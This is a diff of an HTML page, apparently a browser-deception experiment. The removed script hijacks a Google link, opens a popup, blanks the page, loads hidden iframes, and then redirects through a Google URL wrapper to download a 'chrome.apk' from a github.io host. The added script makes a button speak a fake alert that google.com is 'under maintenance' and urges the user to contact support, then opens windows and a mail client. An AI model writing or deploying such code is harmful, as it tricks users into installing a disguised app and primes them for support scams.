@@ -1,39 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Speech + Redirect + Mailto</title>
+
+<style>
+body{
+  font-family: Arial;
+  text-align:center;
+  padding:60px;
+}
+
+button{
+  padding:15px 30px;
+  font-size:20px;
+  cursor:pointer;
+}
+
+#status{
+  margin-top:20px;
+  font-size:18px;
+  color:darkred;
+}
+</style>
+</head>
+
 <body>
-<a id=test href="https://www.google.com/" onclick=foo()><h1>go to google</h1></a>
-</body>
+
+<h2>CLICK TO GOOGLE</h2>
+<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+<div id="status">Status: Waiting...</div>
+
 <script>
-var w;
-var t;
-var z;
-function foo(){
-document.getElementById("test").href="#";
-w = window.open("fake");
-t = setInterval('bar()',1);
-}
-function bar(){
-if(w.location.href !== 'fake'){
-document.body.innerHTML = "";
-slow();
-w.location.href = 'https://www.google.com';
-clearInterval(t);
-z = setInterval('baz()',1);
-}
-}
-function baz(){
-try{
-w.location.href !== 'fake';
-}
-catch (e){
-setTimeout("w.location.replace('https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3');", 3000);
-clearInterval(z);
-}
-}
-function slow() {
-for (i=0; i<10; i++ ) {
-iframe = document.createElement("iframe");
-iframe.src = 'https://www.google.com/';
-iframe.style = 'display:none';
-document.body.appendChild(iframe);
-}
-}
+
+const btn = document.getElementById('speechBtn');
+const status = document.getElementById('status');
+
+btn.addEventListener('click', () => {
+
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+
+  if(!('speechSynthesis' in window)){
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
+  }
+
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = "en-US";
+
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith("en"));
+  if(enVoice) utter.voice = enVoice;
+
+  status.textContent = "Triggering actions...";
+
+  setTimeout(()=>{
+
+    // 1. Play speech
+    speechSynthesis.speak(utter);
+
+    // 2. Open google
+    window.open("https://google.com", "_blank");
+
+    // 3. Trigger mail client
+    window.location.href = "mailto:support@google.com?subject=Support Request";
+
+  },300);
+
+});
+
 </script>
+
+</body>
+</html>
